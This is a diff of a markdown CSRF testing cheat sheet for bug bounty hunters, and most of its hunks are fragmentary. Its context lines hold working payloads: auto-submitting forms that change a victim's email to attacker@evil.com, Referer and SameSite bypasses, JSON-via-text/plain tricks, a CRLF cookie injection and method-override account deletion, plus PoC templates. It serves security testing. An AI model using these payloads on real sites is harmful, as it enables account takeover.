@@ -6,7 +6,7 @@
 
 ## 📍 PART 1: WHERE TO FIND CSRF?
 
-> [!TIP] High-Value Endpoints (Always Test These)
+### High-Value Endpoints (Always Test These)
 ```
 ✅ Account Changes:
 • /change-email, /update-email, /set-email
@@ -27,7 +27,7 @@
 • /upload-avatar, /update-photo, /change-picture
 ```
 
-> [!EXAMPLE] How to Find These Endpoints
+### **How to Find These Endpoints**
 ```bash
 # 1. Manual browsing + Burp Proxy
 # Watch every request when clicking buttons
@@ -49,7 +49,7 @@ curl https://target.com/robots.txt
 
 ## 🔬 PART 2: TESTING METHODOLOGY
 
-> [!CHECKLIST] Quick Test Flow
+### Quick Test Flow
 ```markdown
 - [ ] Is the request changing data? (not read-only)
 - [ ] Does it use cookies for auth? (not Bearer token)
@@ -59,7 +59,7 @@ curl https://target.com/robots.txt
 - [ ] Is the body JSON? → Test Content-Type bypasses
 ```
 
-> [!STEP-BY-STEP] Detection Process
+### **Detection Process**
 ```
 1️⃣ Login → Do action → Capture request in Burp
 
@@ -98,7 +98,7 @@ curl https://target.com/robots.txt
 
 ### 🔐 CSRF Token Bypass
 
-> [!CODE] Delete Token Parameter
+### **Delete Token Parameter**
 ```html
 <form method="POST" action="https://target.com/change-email">
   <input type="hidden" name="email" value="attacker@evil.com">
@@ -107,7 +107,7 @@ curl https://target.com/robots.txt
 <script>document.forms[0].submit();</script>
 ```
 
-> [!CODE] Empty Token Value
+### **Empty Token Value**
 ```html
 <form method="POST" action="https://target.com/change-email">
   <input type="hidden" name="email" value="attacker@evil.com">
@@ -116,7 +116,7 @@ curl https://target.com/robots.txt
 <script>document.forms[0].submit();</script>
 ```
 
-> [!CODE] Token Reuse (Not Session-Bound)
+### *8Token Reuse (Not Session-Bound)**
 ```html
 <!-- Get token from YOUR account, use for victim -->
 <form method="POST" action="https://target.com/change-email">
@@ -130,7 +130,7 @@ curl https://target.com/robots.txt
 
 ### 🌐 Referer/Origin Bypass
 
-> [!CODE] Remove Referer Header
+### **Remove Referer Header**
 ```html
 <head>
   <meta name="referrer" content="no-referrer">
@@ -143,7 +143,7 @@ curl https://target.com/robots.txt
 </body>
 ```
 
-> [!CODE] Spoof Referer with pushState
+### **Spoof Referer with pushState**
 ```html
 <head>
   <meta name="referrer" content="unsafe-url">
@@ -157,7 +157,7 @@ curl https://target.com/robots.txt
 <script>document.forms[0].submit();</script>
 ```
 
-> [!TIP] Domain Spoofing Tricks
+### **Domain Spoofing Tricks**
 ```
 Try these in Referer:
 • https://target.com.evil.com
@@ -171,7 +171,7 @@ Try these in Referer:
 
 ### 🍪 SameSite Cookie Bypass
 
-> [!CODE] SameSite=Lax + GET Request
+### **SameSite=Lax + GET Request**
 ```html
 <!-- Lax allows cookies with GET + top-level navigation -->
 <script>
@@ -179,7 +179,7 @@ Try these in Referer:
 </script>
 ```
 
-> [!CODE] SameSite=Strict + Open Redirect
+### **SameSite=Strict + Open Redirect**
 ```html
 <!-- Find redirect endpoint in same domain -->
 <script>
@@ -187,7 +187,7 @@ Try these in Referer:
 </script>
 ```
 
-> [!CODE] SameSite=Strict + Path Traversal
+### **SameSite=Strict + Path Traversal**
 ```html
 <script>
   // Use path traversal to reach sensitive endpoint
@@ -195,7 +195,7 @@ Try these in Referer:
 </script>
 ```
 
-> [!CODE] SameSite=Strict + Sibling Domain XSS
+ ### **SameSite=Strict + Sibling Domain XSS**
 ```html
 <!-- If cms.target.com has XSS and is same-site -->
 <script>
@@ -208,7 +208,7 @@ Try these in Referer:
 
 ### 📦 JSON Body Bypass
 
-> [!CODE] Method 1: text/plain + Form Trick
+ ### **Method 1: text/plain + Form Trick**
 ```html
 <form method="POST" action="https://target.com/api/update" enctype="text/plain">
   <!-- Creates: {"email":"attacker@evil.com","x":"="} -->
@@ -217,7 +217,7 @@ Try these in Referer:
 <script>document.forms[0].submit();</script>
 ```
 
-> [!CODE] Method 2: Nested JSON
+### **Method 2: Nested JSON**
 ```html
 <form method="POST" action="https://target.com/api/update" enctype="text/plain">
   <input type="hidden" name='{"user":{"email":"' value='attacker@evil.com"'>
@@ -226,7 +226,7 @@ Try these in Referer:
 <script>document.forms[0].submit();</script>
 ```
 
-> [!CODE] Method 3: Fetch + CORS Misconfiguration
+### **Method 3: Fetch + CORS Misconfiguration**
 ```html
 <script>
   fetch("https://target.com/api/update", {
@@ -238,7 +238,7 @@ Try these in Referer:
 </script>
 ```
 
-> [!CODE] Method 4: Content-Type Confusion
+### **Method 4: Content-Type Confusion**
 ```html
 <!-- Send JSON as form-encoded -->
 <form method="POST" action="https://target.com/api/update">
@@ -251,7 +251,7 @@ Try these in Referer:
 
 ### 🔄 Method Override Bypass
 
-> [!CODE] POST → GET
+### **POST → GET*8
 ```html
 <!-- If endpoint accepts GET -->
 <script>
@@ -259,7 +259,7 @@ Try these in Referer:
 </script>
 ```
 
-> [!CODE] _method Parameter
+### **_method Parameter**
 ```html
 <!-- If server supports method spoofing -->
 <form method="POST" action="https://target.com/api/delete-user?_method=DELETE">
@@ -268,7 +268,7 @@ Try these in Referer:
 <script>document.forms[0].submit();</script>
 ```
 
-> [!CODE] Header Override
+### **Header Override**
 ```javascript
 // If server checks X-HTTP-Method-Override
 fetch("https://target.com/api/delete-user", {
@@ -283,7 +283,7 @@ fetch("https://target.com/api/delete-user", {
 
 ### 🍪 Cookie-Based Token Bypass
 
-> [!CODE] Double Submit + CRLF Injection
+### **Double Submit + CRLF Injection**
 ```html
 <!-- Inject fake csrf cookie via vulnerable search -->
 <img src="https://target.com/search?q=x%0d%0aSet-Cookie:%20csrf=FAKE%3b%20SameSite=None" 
@@ -295,7 +295,7 @@ fetch("https://target.com/api/delete-user", {
 </form>
 ```
 
-> [!CODE] Cookie Refresh Endpoint
+### **Cookie Refresh Endpoint**
 ```html
 <!-- If /refresh-session updates cookie via GET -->
 <img src="https://target.com/refresh-session" onerror="executeCSRF()" style="display:none"/>
@@ -312,7 +312,7 @@ fetch("https://target.com/api/delete-user", {
 
 ## 🧰 PART 4: PoC TEMPLATES 
 
-> [!CODE] Basic POST Form
+### **Basic POST Form**
 ```html
 <!DOCTYPE html>
 <html>
@@ -328,7 +328,7 @@ fetch("https://target.com/api/delete-user", {
 </html>
 ```
 
-> [!CODE] GET Request
+### **GET Request**
 ```html
 <!DOCTYPE html>
 <html>
@@ -340,7 +340,7 @@ fetch("https://target.com/api/delete-user", {
 </html>
 ```
 
-> [!CODE] JSON via text/plain
+### **JSON via text/plain**
 ```html
 <!DOCTYPE html>
 <html>
@@ -353,7 +353,7 @@ fetch("https://target.com/api/delete-user", {
 </html>
 ```
 
-> [!CODE] With Referer Bypass
+### **With Referer Bypass**
 ```html
 <!DOCTYPE html>
 <html>
@@ -372,7 +372,7 @@ fetch("https://target.com/api/delete-user", {
 </html>
 ```
 
-> [!CODE] Auto-submit with Delay
+### **Auto-submit with Delay**
 ```html
 <!DOCTYPE html>
 <html>
@@ -393,7 +393,7 @@ fetch("https://target.com/api/delete-user", {
 
 ## 📝 PART 5: REPORT TEMPLATE
 
-> [!CODE] Markdown Report Template
+### **Markdown Report Template**
 ```markdown
 ## Title
 CSRF in [ENDPOINT] allows [IMPACT]
@@ -433,7 +433,7 @@ allowing an attacker to [action] on behalf of authenticated users.
 
 ## 🧭 PART 7: QUICK DECISION TREE
 
-> [!GRAPH] Decision Flow
+### **Decision Flow**
 ```
 Found state-changing endpoint?
 │
@@ -468,7 +468,7 @@ Found state-changing endpoint?
 ```
 ## 💡 PRO TIPS
 
-> [!TIP] From Experience
+### **From Experience**
 ```
 🔹 Always test with FRESH browser session — cached cookies hide bugs
 
@@ -492,7 +492,7 @@ Found state-changing endpoint?
 
 ## 🚀 FINAL CHECKLIST
 
-> [!CHECKLIST] Before Submitting
+### **!CHECKLIST Before Submitting**
 ```markdown
 - [ ] PoC works in fresh browser session (not your logged-in session)
 - [ ] PoC doesn't require user interaction (or clearly states if it does)
@@ -506,14 +506,14 @@ Found state-changing endpoint?
 
 ---
 
-> [!WARNING] Legal Reminder
+### **!WARNING Legal Reminder**
 > Only test on programs you're authorized for. Unauthorized testing is illegal.
 
 ---
 
 ## 🎁 BONUS: One-Liner PoC Generator
 
-> [!CODE] Bash Commands
+### **Bash Commands**
 ```bash
 # Quick PoC for basic CSRF:
 echo '<form method=POST action=https://TARGET/ENDPOINT><input name=FIELD value=VALUE><script>document.forms[0].submit()</script>' > poc.html
@@ -529,7 +529,7 @@ xdg-open poc.html  # Linux
 
 ---
 
-> [!SUMMARY] Key Takeaways
+### **!SUMMARY Key Takeaways**
 > 1. Always test state-changing endpoints first
 > 2. Try `text/plain` for JSON bypasses — works 80% of time
 > 3. Delete CSRF token parameter completely (not just empty)
